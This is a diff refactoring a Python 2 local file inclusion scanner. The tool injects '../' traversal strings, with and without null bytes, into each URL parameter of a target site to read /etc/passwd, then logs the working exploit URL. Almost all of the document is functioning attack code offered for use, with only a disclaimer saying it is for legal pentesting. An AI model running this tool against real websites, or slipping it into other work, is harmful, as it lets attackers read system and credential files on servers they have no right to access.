@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 
 # Simple Local File Inclusion Vulnerability Scanner
 # by Valentin Hoebel (valentin@xenuser.org)
@@ -47,84 +47,67 @@
 
 # Power to the cows!
 
-import getopt, sys, random, urllib, urllib2, httplib, re, string, os
+import getopt
+import sys
+import random
+
 from urllib2 import Request, urlopen, URLError, HTTPError
 from urlparse import urlparse
 from time import gmtime, strftime
- 
-def print_usage(): 
-    print_banner()
-    print "[!] Wrong argument and parameter passed. Use --help and learn how to use this tool :)"
-    print "[i] Hint: You need to pass a value for --url=\"<value>\" ."
-    print "[i] Example: ./lfi_scanner.py --url=\"http://www.example.com/page.php?file=main\" "
-    print ""
-    print ""
-    sys.exit()
-    return
-    
-def print_help():
-    print_banner()
-    print "((Displaying the content for --help.))"
-    print ""
-    print "[Description]"
-    print "The Simple Local File Inclusion Vulnerability Scanner"
-    print "helps you to find LFI vulnerabilities."
-    print ""
-    print "[Usage]"
-    print "./lfi_scanner.py --url=\"<URL with http://>\" "
-    print ""
-    print "[Usage example]"
-    print "./lfi_scanner.py --url=\"http://www.example.com/page.php?file=main\" "
-    print ""
-    print "[Usage notes]"
-    print "- Always use http://...."
-    print "- This tool does not work with SEO URLs, such as http://www.example.com/news-about-the-internet/."
-    print "  If you only have a SEO URL, try to find out the real URL which contents parameters."
-    print ""
-    print "[Feature list]"
-    print "- Provides a random user agent for the connection."
-    print "- Checks if a connection to the target can be established."
-    print "- Tries to catch most errors with error handling. "
-    print "- Scans for LFI vulnerabilities. "
-    print "- Finds out how a possible LFI vulnerability can be exploited (e.g. directory depth)."
-    print "- Supports nullbytes!"
-    print "- Supports common *nix targets, but no Windows systems."
-    print "- Creates a small log file."
-    print ""
-    print "[Some notes]"
-    print "- Tested with Python 2.6.5."
-    print "- Modify, distribute, share and copy the code in any way you like!"
-    print "- Please note that this tool was created for educational purposes only."
-    print "- Do not use this tool in an illegal way. Know and respect your local laws."
-    print "- Only use this tool for legal purposes, such as pentesting your own website :)"
-    print "- I am not responsible if you cause any damage or break the law."
-    print "- Power to teh c0ws!"
-    print ""
-    print ""
-    sys.exit()
-    return
-    
-def print_banner():
-    print ""
-    print ""
-    print ""
-    print "Simple Local File Inclusion Vulnerability Scanner"
-    print "by Valentin Hoebel (valentin@xenuser.org)"
-    print ""
-    print "Version 1.0 (29th December 2010)  ^__^"
-    print "                                  (oo)\________"
-    print "                                  (__)\        )\/\ "
-    print "                                      ||----w |"
-    print "Power to teh cows!                    ||     ||"
-    print "____________________________________________________"
-    print ""
-    return
+
+banner = '''
+Simple Local File Inclusion Vulnerability Scanner
+by Valentin Hoebel (valentin@xenuser.org)
+
+Version 1.0 (29th December 2010)  ^__^
+                                  (oo)\________
+                                  (__)\        )\/\
+                                      ||----w |
+Power to teh cows!                    ||     ||
+____________________________________________________'''
+
+usage = banner + '''
+[!] Wrong argument and parameter passed. Use --help and learn how to use this tool :)
+[i] Hint: You need to pass a value for --url="<value>".
+[i] Example: ./lfi_scanner.py --url="http://www.example.com/page.php?file=main"'''
+
+help = banner + '''((Displaying the content for --help.))
+
+[Description]
+The Simple Local File Inclusion Vulnerability Scanner
+helps you to find LFI vulnerabilities.
+
+[Usage]
+./lfi_scanner.py --url="<URL with http://>"
+
+[Usage example]
+./lfi_scanner.py --url="http://www.example.com/page.php?file=main"
+
+[Usage notes]
+- Always use http://....
+- This tool does not work with SEO URLs, such as http://www.example.com/news-about-the-internet/.
+  If you only have a SEO URL, try to find out the real URL which contents parameters.
+
+[Feature list]
+- Provides a random user agent for the connection.
+- Checks if a connection to the target can be established.
+- Tries to catch most errors with error handling.
+- Scans for LFI vulnerabilities.
+- Finds out how a possible LFI vulnerability can be exploited (e.g. directory depth).
+- Supports nullbytes!
+- Supports common *nix targets, but no Windows systems.
+- Creates a small log file.
+
+[Some notes]
+- Tested with Python 2.6.5.
+- Modify, distribute, share and copy the code in any way you like!
+- Please note that this tool was created for educational purposes only.
+- Do not use this tool in an illegal way. Know and respect your local laws.
+- Only use this tool for legal purposes, such as pentesting your own website :)
+- I am not responsible if you cause any damage or break the law.
+- Power to teh c0ws!'''
 
 def test_url(scan_url):
-    print ""
-    print "[i] Assuming the provided data was correct."
-    print "[i] Trying to establish a connection with a random user agent..."
-    
     user_agents = [
         "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
         "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
@@ -136,34 +119,21 @@ def test_url(scan_url):
         "Opera/8.00 (Windows NT 5.1; U; en)",
         "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
     ]
-    user_agent = random.choice (user_agents)
-    check=""
-    
-    request_website = urllib2.Request(scan_url)
+    user_agent = random.choice(user_agents)
+
+    request_website = Request(scan_url)
     request_website.add_header('User-Agent', user_agent)
-    
+
     try:
-        check = urllib2.urlopen(request_website)
+        check = urlopen(request_website)
     except HTTPError, e:
-        print "[!] The connection could not be established."
-        print "[!] Error code: ", e
-        print "[!] Exiting now!"
-        print ""
-        print ""
-        sys.exit(1)
+        return (HTTPError, e)
     except URLError, e:
-        print "[!] The connection could not be established."
-        print "[!] Reason: ", e
-        print "[!] Exiting now!"
-        print ""
-        print ""
-        sys.exit(1)
+        return (URLError, e)
     else:
-        print "[i] Connected to target! URL seems to be valid."
-        print "[i] Jumping to the scan feature."
-    return 
-    
-    
+        return (None, None)
+
+
 def scan_lfi(scan_url):
     # Define all variables of this function
     parameters = {}
@@ -214,7 +184,7 @@ def scan_lfi(scan_url):
     local_file = "etc/passwd"
     local_file_for_first_test = "/etc/passwd"
     lfi_exploit_url = ""
-    
+
      # We have to split up the URL in order to replace the value of the vulnerable parameter
     get_parsed_url = urlparse(scan_url)
     print "[i] IP address / domain: " + get_parsed_url.netloc
@@ -227,21 +197,21 @@ def scan_lfi(scan_url):
         print "[!] The URL doesn't contain a query string (e.g. index.php?var1=x&controller=main)."
     else:
         print "[i] URL query string:", get_parsed_url.query
-        print ""
+        print
 
     # Finding all URL parameters
     if param_sign_1 in scan_url and param_equals in scan_url:
         print "[i] It seems that the URL contains at least one parameter."
         print "[i] Trying to find also other parameters..."
-        
+
         # It seems that there is at least one parameter in the URL. Trying to find out if there are also others...
         if param_sign_2 in get_parsed_url.query and param_equals in get_parsed_url.query:
             print "[i] Also found at least one other parameter in the URL."
         else:
             print "[i] No other parameters were found."
-            
+
     else:
-        print ""
+        print
         print "[!] It seems that there is no parameter in the URL."
         print "[!] How am I supposed to find a vulnerability then?"
         print "[!] Please provide an URL with a script and query string."
@@ -249,42 +219,42 @@ def scan_lfi(scan_url):
         print "[!] Hint: I can't handle SEO links, so try to find an URL with a query string."
         print "[!] This can most likely be done by having a look at the source code (rightclick -> show source code in your browser)."
         print "[!] Exiting now!"
-        print ""
-        print ""
+        print
+        print
         sys.exit(1)
-    
+
     # Detect the parameters
     # Thanks to atomized.org for the URL splitting and parameters parsing part!
     parameters = dict([part.split('=') for part in get_parsed_url[4].split('&')])
 
     # Count the parameters
     parameters_count = len(parameters)
-    
+
     # Print the parameters and store them in single variables
     print "[i] The following", parameters_count, "parameter(s) was/were found:"
     print "[i]", parameters
-    
+
     # Have a look at each parameter and do some nasty stuff 
     for index, item in enumerate(parameters):
         print "[i] Probing parameter \"", item, "\"..."
-        
+
         check_value_of_tested_parameter = local_file_for_first_test 
         check_value_of_tested_parameter_with_nullbyte = local_file_for_first_test + nullbyte
         query_string = get_parsed_url.query
-    
+
         # Find out what value the checked parameter currently has
         for key, value in parameters.items():
             if key == item:
                 # Save the value of the vulnerable parameter, so we later can search in in the URL
                 original_value_of_tested_parameter = value
-    
+
         # Our main routine, maybe the most important part of this script
         # At first without the nullbyte
         for depth in range(i, max_depth):
             # Replace the default value of the vulnerable parameter with our LFI string
             replace_string = (depth * one_step_deeper) + local_file
             replace_string_2 = item + param_equals + (depth * one_step_deeper) + local_file
-            
+
             # The first test is a special case. With the code above, we would check for the file "etc/passwd" which does not
             # work. Therefore we replace "etc/passwd" with "/etc/passwd" for our first vulnerability check.
             if depth== 0:
@@ -293,20 +263,20 @@ def scan_lfi(scan_url):
 
             replace_me = item + param_equals + original_value_of_tested_parameter
             modified_query_string = query_string.replace(replace_me, replace_string_2)
-            
+
             # Now craft the URL
             lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
             lfi_url_part_two = "".join(get_parsed_url[1:2]) 
             lfi_url_part_three = "".join(get_parsed_url[2:3]) + "?"
             lfi_url_part_four = "".join(modified_query_string) 
             lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
-            
+
             # Ok, everything is prepared to enter subspace.. eeh, to call the URL (Stargate fans get this joke!)
-            request_website = urllib2.Request(lfi_url)
+            request_website = Request(lfi_url)
             request_website.add_header('User-Agent', user_agent)
-    
+
             try:
-                lfi_response = urllib2.urlopen(request_website)
+                lfi_response = urlopen(request_website)
             except URLError, e:
                 print "[!] The connection could not be established."
                 print "[!] Reason: ", e
@@ -352,13 +322,13 @@ def scan_lfi(scan_url):
                 lfi_url_part_three = "".join(get_parsed_url[2:3]) + "?"
                 lfi_url_part_four = "".join(modified_query_string)
                 lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
-            
+
                 # Ok, everything is prepared to enter subspace.. eeh, to call the URL (Stargate fans get this joke!)
-                request_website = urllib2.Request(lfi_url)
+                request_website = Request(lfi_url)
                 request_website.add_header('User-Agent', user_agent)
                 
                 try:
-                    lfi_response = urllib2.urlopen(request_website)
+                    lfi_response = urlopen(request_website)
                 except URLError, e:
                     print "[!] The connection could not be established."
                     print "[!] Reason: ", e
@@ -379,67 +349,75 @@ def scan_lfi(scan_url):
                             lfi_found = 1
                             exploit_depth = depth
                             break
-        
+
     if lfi_found == 0:
         print "[!] Sorry, I was not able to detect a LFI vulnerability here."
         print "[!] Exiting now!"
-        print ""
-        print ""
+        print
+        print
         sys.exit()
 
     # Create a simple log file
     log_file_name = get_parsed_url.netloc + "_-_" + strftime("%d_%b_%Y_%H:%M:%S_+0000", gmtime()) + "_-_scan.log"
-    FILE = open(log_file_name, "w")
-    FILE.write("Simple Local File Inclusion Vulnerability Scanner - Log File\n")
-    FILE.write("----------------------------------------------------------------------\n\n")
-    FILE.write("Scanned URL:\n")
-    FILE.write(scan_url + "\n\n")
-    FILE.write("LFI URL:\n")
-    FILE.write(lfi_exploit_url)
-    FILE.close
+    with open(log_file_name, "w") as f:
+        f.write("Simple Local File Inclusion Vulnerability Scanner - Log File\n")
+        f.write("------------------------------------------------------------\n\n")
+        f.write("Scanned URL:\n")
+        f.write(scan_url + "\n\n")
+        f.write("LFI URL:\n")
+        f.write(lfi_exploit_url)
 
-    print ""
+    print
     print "[i] A small log file was created."
     print "[i] Completed the scan. Will now exit!"
-    print ""
-    print""
-    sys.exit(1)
 
-    return
-    
-    
 def main(argv):
-    scan_url = ""
+    scan_url = ''
     
     try:
-        opts, args = getopt.getopt(argv, "hu:", ["help", "url="])
+        opts, args = getopt.getopt(argv, 'hu:', ['help', 'url='])
     except getopt.GetoptError:
-        print_usage()
-        sys.exit(2)
-    
+        print usage
+        sys.exit(1)
+
     for opt, arg in opts:
-        if opt in ("--help"):
-            print_help()
-            break
-            sys.exit(1)
-        elif opt in ("--url"):
-            scan_url=arg
-            
-    if len(scan_url) < 1:
-        print_usage()
-        sys.exit()
-        
+        if opt in ('h', '--help'):
+            print help
+            sys.exit(0)
+        elif opt in ('u', '--url'):
+            scan_url = arg
+
+    if not scan_url:
+        print usage
+        sys.exit(1)
+
     # Continue if all required arguments were passed to the script.
-    print_banner()
+    print banner
     print "[i] Provided URL to scan: " + scan_url
-    
+
+    print
+    print "[i] Assuming the provided data was correct."
+    print "[i] Trying to establish a connection with a random user agent..."
+
     # Check if URL is reachable
-    test_url(scan_url)
+    error, message = test_url(scan_url)
+
+    if error == HTTPError:
+        print "[!] The connection could not be established."
+        print "[!] Error code: ", message
+        print "[!] Exiting now!"
+        sys.exit(1)
+    elif error == URLError:
+        print "[!] The connection could not be established."
+        print "[!] Reason: ", message
+        print "[!] Exiting now!"
+        sys.exit(1)
+    else:
+        print "[i] Connected to target! URL seems to be valid."
+        print "[i] Jumping to the scan feature."
 
     # Calling the LFI scanner function
     scan_lfi(scan_url)
 
 if __name__ == "__main__":
     main(sys.argv[1:])
-    
-### EOF ###
